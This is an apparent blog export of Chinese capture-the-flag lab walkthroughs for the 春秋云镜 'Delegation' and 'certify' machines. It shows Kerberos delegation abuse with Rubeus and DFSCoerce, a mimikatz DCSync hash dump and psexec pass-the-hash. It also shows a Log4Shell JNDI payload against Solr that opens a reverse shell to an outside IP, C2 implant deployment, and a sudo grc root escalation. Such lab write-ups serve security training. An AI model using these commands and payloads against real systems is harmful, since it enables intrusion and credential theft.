class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\<span class="built_in">test</span>\Desktop&gt; Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0 </span><br><span class="line"></span><br><span class="line">[*] Action: TGT Monitoring</span><br><span class="line">[*] Target user     : DC01$</span><br><span class="line">[*] Monitoring every 1 seconds <span class="keyword">for</span> new TGTs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] 2025/4/17 12:47:53 UTC - Found new TGT:</span><br><span class="line"></span><br><span class="line">  User                  :  DC01<span class="variable">$@XIAORANG</span>.LAB</span><br><span class="line">  StartTime             :  2025/4/17 18:30:28</span><br><span class="line">  EndTime               :  2025/4/18 4:30:28</span><br><span class="line">  RenewTill             :  2025/4/24 18:30:28</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4ereAZNppyfXIFLVpLB7zObk5iqLBnrLVdf0ByONcUmci/OBrOyi4yWwRM5n/jbYy1M7SbsEz3HRqW3en0KLp1l8GlmkP+YwIBSkSLg95XFL5iOhsCSL5i0xgHNVpdLHRRX3j8rEPmt0LSqaX7YMFEK74o8HpgGEgomXPn7KoCAPKXJ7Z81W/KWryzY/uRvoTK/emXzw8GfxH8bGUXYj3+fkjE3FHEWsIKkRpFBVrtno0rMWuHu81K8UutdG4gXuCdTD/d4UBX5l9tlpWxvHFcyaBQzkanqZxO/I2Y5fAxN45XEDH3lnY2ulKCHRSHYyF1cs9NH1kFvr4/WHE24OsYZLolRo/hnDlbf3m92tXykwuznF4/GUu//fftpWxVRp3JvbcLUWC0DlC2v6RJXDb8IUkIfEAavUWFhSsQc7vFbEbqjc7RPCFvpIiigfNpI9a7VNrSGWFAQHnATrVFLVJqXW6n8MkaukhCKc7njomI6qwYDdKhkidckelP3LYyhYYnKc23NmMkDfdqEwOdXWLeWlmTT65j2n+eWOIGjAohtceChs96F5G8+sqgWgnIs40VHfOSfx9Gitw8prA/1zmunoANcRikaTM4QWyur3RhxvME9MIW5DG4Zj8K0wKSkAzjADt6bJEMmbeJg26L6D//lhMWDeFPGbcrOxqEhcHTZmA9yzcoJDbEudVhYzD86CJXZOJSyEZTq+GLDHs/V1lr+vSW+uJLwgcI0Rrjz9IRhKDBv7QZcmbyAY5Llod0bPua2ix7OH7Z8jJH6mGitcciB0ifhsviwJHPpWD+EcuLcMXUzTqP1WGhtM671THHmpGODlgPaB32JwID5oru9tmmXvf5Z5sFk7HPvilJfXUx7S8Uf95zEfnP7OKJ181UALB2nHNwuuqP1lKLLTlX1g/gf+ejVvuLwKbVZn3my650zaVh1orpfGaEc6CfI1p3b3E+8ycyYQiKwUfrOg2Sq0uqjanhfXtB1SZns1mqXgL1RZf5VaV7IxYjnGei6OJ+L0iIvVjb8qAJtsUwbBPomfhE5Gd2MaGnUxDNlTd7QUaY/u/GCXgdkpwX/0UjnB5i53I4E0Y9WHgmtintLIHlAoyJYVyDiMD6rwhfT3WgYm+ekWsrOqLUzG5uekj+1NkvheMP0BtK+7FCvatuMdf/Jw9Ror7Bh0bYpCZr4Ir8NE8mhPsEjhJhh+9pBPtBrsN7fTx8tQuRVgh7i32MGSgUyH2CorOSADQCoCDeiT47F2JzTFLFrtIozTfsMD5i6p7I437Xl5it5BmUqLzt+OhvQQgLCnIaxfwa7z86SkUYpv8hpiXAxYHNFAaO/0vR3tG1acmva/t6ITiZL4AAk7+rkEUIZllDQ1N2/tZ/hePHfUfKwOk8l4QK+rsMM/n2OVJH7MXgc4gCwm0X3QwZe0DuWypcipyCLSOFUnNyN2UNM1ejgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDDwDQYukDDru2zsu2EElsPKwtvLfdfwIKk06mp/aRY+6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxNzEwMzAyOFqmERgPMjAyNTA0MTcyMDMwMjhapxEYDzIwMjUwNDI0MTAzMDI4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/25.png"></p><p>非约束委派，这个需要我们强制域控访问这台主机，才能获取到相关信息，这里利用<code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;DFSCoerce&lt;/font&gt;</code>强制DC访问域成员进而获取TGT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dfscoerce.py -u WIN19$ -hashes :dbee1706b84bb6f5ed05e5b7c0a8e86a -d xiaorang.lab win19 172.22.4.7</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/26.png"></p><p>然后使用Rubeus.exe导入票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4ereAZNppyfXIFLVpLB7zObk5iqLBnrLVdf0ByONcUmci/OBrOyi4yWwRM5n/jbYy1M7SbsEz3HRqW3en0KLp1l8GlmkP+YwIBSkSLg95XFL5iOhsCSL5i0xgHNVpdLHRRX3j8rEPmt0LSqaX7YMFEK74o8HpgGEgomXPn7KoCAPKXJ7Z81W/KWryzY/uRvoTK/emXzw8GfxH8bGUXYj3+fkjE3FHEWsIKkRpFBVrtno0rMWuHu81K8UutdG4gXuCdTD/d4UBX5l9tlpWxvHFcyaBQzkanqZxO/I2Y5fAxN45XEDH3lnY2ulKCHRSHYyF1cs9NH1kFvr4/WHE24OsYZLolRo/hnDlbf3m92tXykwuznF4/GUu//fftpWxVRp3JvbcLUWC0DlC2v6RJXDb8IUkIfEAavUWFhSsQc7vFbEbqjc7RPCFvpIiigfNpI9a7VNrSGWFAQHnATrVFLVJqXW6n8MkaukhCKc7njomI6qwYDdKhkidckelP3LYyhYYnKc23NmMkDfdqEwOdXWLeWlmTT65j2n+eWOIGjAohtceChs96F5G8+sqgWgnIs40VHfOSfx9Gitw8prA/1zmunoANcRikaTM4QWyur3RhxvME9MIW5DG4Zj8K0wKSkAzjADt6bJEMmbeJg26L6D//lhMWDeFPGbcrOxqEhcHTZmA9yzcoJDbEudVhYzD86CJXZOJSyEZTq+GLDHs/V1lr+vSW+uJLwgcI0Rrjz9IRhKDBv7QZcmbyAY5Llod0bPua2ix7OH7Z8jJH6mGitcciB0ifhsviwJHPpWD+EcuLcMXUzTqP1WGhtM671THHmpGODlgPaB32JwID5oru9tmmXvf5Z5sFk7HPvilJfXUx7S8Uf95zEfnP7OKJ181UALB2nHNwuuqP1lKLLTlX1g/gf+ejVvuLwKbVZn3my650zaVh1orpfGaEc6CfI1p3b3E+8ycyYQiKwUfrOg2Sq0uqjanhfXtB1SZns1mqXgL1RZf5VaV7IxYjnGei6OJ+L0iIvVjb8qAJtsUwbBPomfhE5Gd2MaGnUxDNlTd7QUaY/u/GCXgdkpwX/0UjnB5i53I4E0Y9WHgmtintLIHlAoyJYVyDiMD6rwhfT3WgYm+ekWsrOqLUzG5uekj+1NkvheMP0BtK+7FCvatuMdf/Jw9Ror7Bh0bYpCZr4Ir8NE8mhPsEjhJhh+9pBPtBrsN7fTx8tQuRVgh7i32MGSgUyH2CorOSADQCoCDeiT47F2JzTFLFrtIozTfsMD5i6p7I437Xl5it5BmUqLzt+OhvQQgLCnIaxfwa7z86SkUYpv8hpiXAxYHNFAaO/0vR3tG1acmva/t6ITiZL4AAk7+rkEUIZllDQ1N2/tZ/hePHfUfKwOk8l4QK+rsMM/n2OVJH7MXgc4gCwm0X3QwZe0DuWypcipyCLSOFUnNyN2UNM1ejgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDDwDQYukDDru2zsu2EElsPKwtvLfdfwIKk06mp/aRY+6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxNzEwMzAyOFqmERgPMjAyNTA0MTcyMDMwMjhapxEYDzIwMjUwNDI0MTAzMDI4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/27.png"></p><h3 id="DCsync攻击–获取hash横向"><a href="#DCsync攻击–获取hash横向" class="headerlink" title="DCsync攻击–获取hash横向"></a>DCsync攻击–获取hash横向</h3><p>其实就是再重新抓取一下hash</p><p>也是成功抓到域管的hash了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="built_in">test</span>\Desktop&gt; mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) <span class="comment">#19041 Sep 19 2022 17:44:08</span></span><br><span class="line"> .## ^ <span class="comment">##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /domain:xiaorang.lab /all /csv</span></span><br><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502krbtgt767e06b9c74fd628dd13785006a9092b514</span><br><span class="line">1105Aldrich98ce19dd5ce74f670d230c7b1aa016d0512</span><br><span class="line">1106Marcusb91c7cc463735bf0e599a2d0a04df110512</span><br><span class="line">1112WIN-3X7U15C2XDM$c3ddf0ffd17c48e6c40e6eda9c9fbaf74096</span><br><span class="line">1113WIN-YUUAW2QG9MF$125d0e9790105be68deb6002690fc91b4096</span><br><span class="line">1000DC01$2d26b66683d29d32ca8f7aa55451c6f2532480</span><br><span class="line">500Administrator4889f6553239ace1f7c47fa2c619c252512</span><br><span class="line">1103FILESERVER$0fc3b6a1325be6483f48f665c57ae01e4096</span><br><span class="line">1104WIN19$dbee1706b84bb6f5ed05e5b7c0a8e86a528384</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取flag03</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root?kali)-[/home/kali/red]</span><br><span class="line">└─# proxychains4 impacket-psexec xiaorang/Administrator@172.22.4.19 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk </span><br><span class="line"></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.4.19:445  ...  OK</span><br><span class="line">[*] Requesting shares on 172.22.4.19.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file KGsavIuf.exe</span><br><span class="line">[*] Opening SVCManager on 172.22.4.19.....</span><br><span class="line">[*] Creating service GQdS on 172.22.4.19.....</span><br><span class="line">[*] Starting service GQdS.....</span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.4.19:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.4.19:445  ...  OK</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands                                                                                                                                                                                                                                      [proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.4.19:445  ...  OK</span><br><span class="line">Microsoft Windows [版本 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\windows\system32&gt; <span class="built_in">cd</span> C:\Users\Administrator\flag</span><br><span class="line">C:\Users\Administrator\flag&gt; <span class="built_in">type</span> flag03.txt                                                                                                                                                                                                                                    . .       . .       .         . .       . .       . .       . .    .    .       . .       . .    </span><br><span class="line">.+<span class="string">&#x27;|=|`+. .+&#x27;</span>|=|`+. .+<span class="string">&#x27;|      .+&#x27;</span>|=|`+. .+<span class="string">&#x27;|=|`+. .+&#x27;</span>|=|`+. .+<span class="string">&#x27;|=|`+.=|`+. |`+. .+&#x27;</span>|=|`+. .+<span class="string">&#x27;|=|`+. </span></span><br><span class="line"><span class="string">|  | `+ | |  | `+.| |  |      |  | `+.| |  | `+.| |  | |  | |.+&#x27;</span> |  | `+.| |  | |  | |  | |  | `+ | </span><br><span class="line">|  |  | | |  |=|`.  |  |      |  |=|`.  |  | .    |  |=|  |      |  |      |  | |  | |  | |  |  | | </span><br><span class="line">|  |  | | |  | `.|  |  |      |  | `.|  |  | |`+. |  | |  |      |  |      |  | |  | |  | |  |  | | </span><br><span class="line">|  |  | | |  |    . |  |    . |  |    . |  | `. | |  | |  |      |  |      |  | |  | |  | |  |  | | </span><br><span class="line">|  | .+ | |  | .+<span class="string">&#x27;| |  | .+&#x27;</span>| |  | .+<span class="string">&#x27;| |  | .+ | |  | |  |      |  |      |  | |  | |  | |  |  | | </span></span><br><span class="line"><span class="string">`+.|=|.+&#x27;</span> `+.|=|.+<span class="string">&#x27; `+.|=|.+&#x27;</span> `+.|=|.+<span class="string">&#x27; `+.|=|.+&#x27;</span> `+.| |..|      |.+<span class="string">&#x27;      |.+&#x27;</span> `+.|=|.+<span class="string">&#x27; `+.|  |.| </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag03: flag&#123;36ca1e48-792d-42a1-9fdb-2c523046cc78&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here is fileserver.xiaorang.lab, you might find something interesting on this host that can help you!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>获取flag04(同上)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py Administrator@172.22.4.7  -hashes 00000000000000000000000000000000:4889f6553239ace1f7c47fa2c619c252 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/28.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-certify</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/cyy001128/article/details/145285068">https://blog.csdn.net/cyy001128/article/details/145285068</a></p><p><font style="color:rgb(255, 255, 255);background-color:rgb(36, 42, 65);">39.99.148.57</font></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan火绒<span class="number">6.0</span>免杀版\未免杀<span class="number">5</span>号黯区红队开发的fscan图形化和plus&gt;fscan.exe <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">148.57</span></span><br><span class="line"></span><br><span class="line">  ______                   _____  _</span><br><span class="line"> |  ____|                 |  __ \| |</span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___</span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/</span><br><span class="line">                     fscan version: <span class="number">1.8</span>.<span class="number">4</span> TeamdArk5 v1.<span class="number">0</span></span><br><span class="line"><span class="built_in">start</span> infoscan</span><br><span class="line"><span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span> open</span><br><span class="line"><span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">22</span> open</span><br><span class="line">[*] alive ports len is: <span class="number">3</span></span><br><span class="line"><span class="built_in">start</span> vulscan</span><br><span class="line">[*] WebTitle http://<span class="number">39.99</span>.<span class="number">148.57</span>       code:<span class="number">200</span> len:<span class="number">612</span>    title:Welcome to nginx!</span><br><span class="line">[*] WebTitle http://<span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span>  code:<span class="number">302</span> len:<span class="number">0</span>      title:None 跳转url: http://<span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span>/solr/</span><br><span class="line">[*] WebTitle http://<span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span>/solr/ code:<span class="number">200</span> len:<span class="number">16555</span>  title:Solr Admin</span><br><span class="line">已完成 <span class="number">2</span>/<span class="number">3</span> [-] ssh <span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">22</span> admin <span class="number">2</span>wsx@WSX ssh: handshake failed: ssh: unable to authenticate, attempted methods [<span class="type">none</span>], no supported methods remain</span><br><span class="line">已完成 <span class="number">3</span>/<span class="number">3</span></span><br><span class="line">[*] 扫描结束,耗时: <span class="number">1</span>m7.<span class="number">8837954</span>s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/1.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/2.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span>/solr/admin/cores?action=<span class="variable">$</span>&#123;jndi:ldap://<span class="variable">$</span>&#123;sys:java.version&#125;.ij0d7l.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p>探测一下</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/3.png"></p><p>开打,记得把1389、8080、1122端口都开放了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-jar</span> JNDIExploit<span class="literal">-2</span>.<span class="number">0</span><span class="literal">-SNAPSHOT</span>.jar <span class="literal">-i</span> <span class="number">47.113</span>.<span class="number">229.136</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">39.99</span>.<span class="number">148.57</span>:<span class="number">8983</span>/solr/admin/cores?action=<span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/Basic/ReverseShell/<span class="number">47.113</span>.<span class="number">229.136</span>/<span class="number">1122</span>&#125;</span><br><span class="line"></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">1122</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/4.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/5.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/6.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/7.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/8.png"></p><p>getshell成功</p><p>我们接下来上线vshell</p><p>命令一键上线</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/9.png"></p><p>没权限访问root，接下来我们需要提权</p><p>suid和sudo</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/10.png"></p><p>grc</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/11.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo grc <span class="literal">--pty</span> /bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solr@ubuntu:/tmp<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> solr on ubuntu:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User solr may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/grc</span><br><span class="line">solr@ubuntu:/tmp<span class="variable">$</span> sudo grc <span class="literal">--pty</span> /bin/sh</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><p>提权成功，我们再次上线vshell</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/12.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/13.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">solr@ubuntu:/opt/solr/server<span class="variable">$</span> ifconfig</span><br><span class="line">ifconfig</span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">172.22</span>.<span class="number">9.19</span>  netmask <span class="number">255.255</span>.<span class="number">0.0</span>  broadcast <span class="number">172.22</span>.<span class="number">255.255</span></span><br><span class="line">        inet6 fe80::<span class="number">216</span>:<span class="number">3</span>eff:fe10:<span class="number">73</span>d9  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x20&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">10</span>:<span class="number">73</span>:d9  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">165623</span>  bytes <span class="number">194435710</span> (<span class="number">194.4</span> MB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">46783</span>  bytes <span class="number">16781417</span> (<span class="number">16.7</span> MB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span>.<span class="number">0.1</span>  netmask <span class="number">255.0</span>.<span class="number">0.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0</span>x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">1627</span>  bytes <span class="number">191317</span> (<span class="number">191.3</span> KB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">1627</span>  bytes <span class="number">191317</span> (<span class="number">191.3</span> KB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>172.22.9.19&#x2F;24</p><p>继续横向，传fscan</p><p>并且挂代理</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/14.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/15.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/16.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 